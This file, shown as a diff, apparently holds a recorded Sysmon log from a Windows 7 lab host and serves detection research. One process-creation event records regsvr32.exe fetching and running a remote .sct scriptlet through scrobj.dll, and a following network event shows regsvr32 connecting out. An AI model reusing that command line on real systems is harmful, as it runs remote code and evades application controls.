@@ -1,0 +1,253 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-13T18:02:49.160591100Z" />
+      <EventRecordID>17285</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="276" ThreadID="1000" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-13 18:02:47.527</Data>
+      <Data Name="ProcessGuid">{365abb72-b147-5cd9-0000-00109d4f0b00}</Data>
+      <Data Name="ProcessId">3828</Data>
+      <Data Name="Image">C:\Windows\System32\mobsync.exe</Data>
+      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+      <Data Name="Description">Microsoft Sync Center</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">C:\Windows\System32\mobsync.exe -Embedding</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-b0ec-5cd9-0000-00201d340100}</Data>
+      <Data Name="LogonId">0x1341d</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=02A887DF2F485A19A051AF0F3D01DAC006DD9A83,MD5=CCA67BD391CFC9F036323B2522887A6A,SHA256=79F5BC1AD13A5575A52D39A000D0873B31865659B5EFC66A7FEF5E43E54C38B9,IMPHASH=8B7E2EE81565F21F95BADB244F9C56E6</Data>
+      <Data Name="ParentProcessGuid">{365abb72-b0eb-5cd9-0000-00108d760000}</Data>
+      <Data Name="ParentProcessId">596</Data>
+      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k DcomLaunch</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-13T18:03:19.681478000Z" />
+      <EventRecordID>17286</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="276" ThreadID="1000" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-13 18:03:19.482</Data>
+      <Data Name="ProcessGuid">{365abb72-b167-5cd9-0000-0010ee150c00}</Data>
+      <Data Name="ProcessId">2372</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
+      <Data Name="Description">Windows Command Processor</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">/c notepad.exe</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-b0ec-5cd9-0000-0020de330100}</Data>
+      <Data Name="LogonId">0x133de</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=EE8CBF12D87C4D388F09B4F69BED2E91682920B5,MD5=AD7B9C14083B52BC532FBA5948342B98,SHA256=17F746D82695FA9B35493B41859D39D786D32B23A9D2E00F4011DEC7A02402AE,IMPHASH=CEEFB55F764020CC5C5F8F23349AB163</Data>
+      <Data Name="ParentProcessGuid">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>
+      <Data Name="ParentProcessId">944</Data>
+      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-13T18:03:19.681478000Z" />
+      <EventRecordID>17287</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="276" ThreadID="1000" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-13 18:03:19.497</Data>
+      <Data Name="ProcessGuid">{365abb72-b167-5cd9-0000-001062160c00}</Data>
+      <Data Name="ProcessId">2476</Data>
+      <Data Name="Image">C:\Windows\System32\regsvr32.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Microsoft(C) Register Server</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-b0ec-5cd9-0000-00201d340100}</Data>
+      <Data Name="LogonId">0x1341d</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>
+      <Data Name="ParentProcessGuid">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>
+      <Data Name="ParentProcessId">944</Data>
+      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-13T18:03:19.895876800Z" />
+      <EventRecordID>17288</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="276" ThreadID="1000" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-13 18:03:19.727</Data>
+      <Data Name="ProcessGuid">{365abb72-b167-5cd9-0000-00109d240c00}</Data>
+      <Data Name="ProcessId">2584</Data>
+      <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">Notepad</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">notepad.exe</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="LogonGuid">{365abb72-b0ec-5cd9-0000-0020de330100}</Data>
+      <Data Name="LogonId">0x133de</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=FC64B1EF19E7F35642B2A2EA5F5D9F4246866243,MD5=A4F6DF0E33E644E802C8798ED94D80EA,SHA256=B56AFE7165AD341A749D2D3BD925D879728A1FE4A4DF206145C1A69AA233F68B,IMPHASH=53A6715F589E88C4FD4541C81B4F57C3</Data>
+      <Data Name="ParentProcessGuid">{365abb72-b167-5cd9-0000-0010ee150c00}</Data>
+      <Data Name="ParentProcessId">2372</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">/c notepad.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>3</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>3</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-13T18:03:21.212898000Z" />
+      <EventRecordID>17289</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="276" ThreadID="2056" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-13 18:03:20.485</Data>
+      <Data Name="ProcessGuid">{365abb72-b167-5cd9-0000-001062160c00}</Data>
+      <Data Name="ProcessId">2476</Data>
+      <Data Name="Image">C:\Windows\System32\regsvr32.exe</Data>
+      <Data Name="User">IEWIN7\IEUser</Data>
+      <Data Name="Protocol">tcp</Data>
+      <Data Name="Initiated">true</Data>
+      <Data Name="SourceIsIpv6">false</Data>
+      <Data Name="SourceIp">10.0.2.15</Data>
+      <Data Name="SourceHostname">IEWIN7</Data>
+      <Data Name="SourcePort">49159</Data>
+      <Data Name="SourcePortName">
+      </Data>
+      <Data Name="DestinationIsIpv6">false</Data>
+      <Data Name="DestinationIp">151.101.128.133</Data>
+      <Data Name="DestinationHostname">
+      </Data>
+      <Data Name="DestinationPort">443</Data>
+      <Data Name="DestinationPortName">https</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2019-05-13T18:05:18.692037600Z" />
+      <EventRecordID>17292</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="276" ThreadID="1000" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>IEWIN7</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2019-05-13 18:05:18.676</Data>
+      <Data Name="ProcessGuid">{365abb72-b1de-5cd9-0000-0010715b0d00}</Data>
+      <Data Name="ProcessId">1188</Data>
+      <Data Name="Image">C:\Windows\System32\wbem\WMIADAP.exe</Data>
+      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
+      <Data Name="Description">WMI Reverse Performance Adapter Maintenance Utility</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="CommandLine">wmiadap.exe /F /T /R</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{365abb72-b0eb-5cd9-0000-0020e7030000}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="TerminalSessionId">0</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">SHA1=DC6DC543EAC398DE6821325BFF3625C1CFC8EC3D,MD5=52799EAD792B0E9AE7FD4BA5BD18FE5C,SHA256=BE4838F4DB23D56CF75730DD36451C5F0F2ACA36B8A74844E7675DC5D5AD0C58,IMPHASH=FAAD498DDAEF07E1AF22EEF06D02AE2C</Data>
+      <Data Name="ParentProcessGuid">{365abb72-b0ec-5cd9-0000-0010d9d20000}</Data>
+      <Data Name="ParentProcessId">944</Data>
+      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs</Data>
+    </EventData>
+  </Event>
+</root>
